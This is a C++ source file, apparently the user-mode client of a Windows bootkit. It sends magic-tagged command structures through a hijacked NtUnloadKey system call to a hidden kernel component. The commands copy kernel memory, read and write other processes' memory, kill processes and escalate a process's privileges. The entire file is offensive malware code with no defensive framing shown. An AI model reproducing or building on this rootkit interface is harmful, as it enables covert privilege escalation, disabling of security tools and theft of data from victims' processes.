#include "bootkit.h"

#pragma warning(disable: 6387)

Bootkit::Bootkit() 
{
    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    NtUnloadKey = (NtUnloadKey_t)GetProcAddress(ntdll, "NtUnloadKey");
}

uint64_t Bootkit::copy_kernel_memory(uint64_t address, uint64_t* buffer, uint64_t size)
{
    command_t cmd = { 0 };
    cmd.magic     = command_magic;
    cmd.type      = command_type::CopyKernelMemory;

    cmd.data[0]   = address;
    cmd.data[1]   = (uint64_t)buffer;
    cmd.data[2]   = size;

    return NtUnloadKey((uint64_t)&cmd);;
}

uint64_t Bootkit::write_process_memory(uint64_t pid, uint64_t address, uint64_t* buffer, uint64_t size)
{
    command_t cmd = { 0 };
    cmd.magic     = command_magic;
    cmd.type      = command_type::WriteProcessMemory;

    cmd.data[0]   = address;
    cmd.data[1]   = (uint64_t)buffer;
    cmd.data[2]   = size;
    cmd.data[3]   = pid;

    return NtUnloadKey((uint64_t)&cmd);;
}

uint64_t Bootkit::read_process_memory(uint64_t pid, uint64_t address, uint64_t* buffer, uint64_t size)
{
    command_t cmd = { 0 };
    cmd.magic     = command_magic;
    cmd.type      = command_type::ReadProcessMemory;

    cmd.data[0]   = address;
    cmd.data[1]   = (uint64_t)buffer;
    cmd.data[2]   = size;
    cmd.data[3]   = pid;

    return NtUnloadKey((uint64_t)&cmd);;
}

uint64_t Bootkit::kill_process(uint64_t pid)
{
    command_t cmd = { 0 };
    cmd.magic     = command_magic;
    cmd.type      = command_type::KillProcess;
    cmd.data[0]   = pid;

    return NtUnloadKey((uint64_t)&cmd);;
}

uint64_t Bootkit::privilege_escalation(uint64_t pid)
{
    command_t cmd = { 0 };
    cmd.magic     = command_magic;
    cmd.type      = command_type::PrivilegeEscalation;
    cmd.data[0]   = pid;

    return NtUnloadKey((uint64_t)&cmd);;
}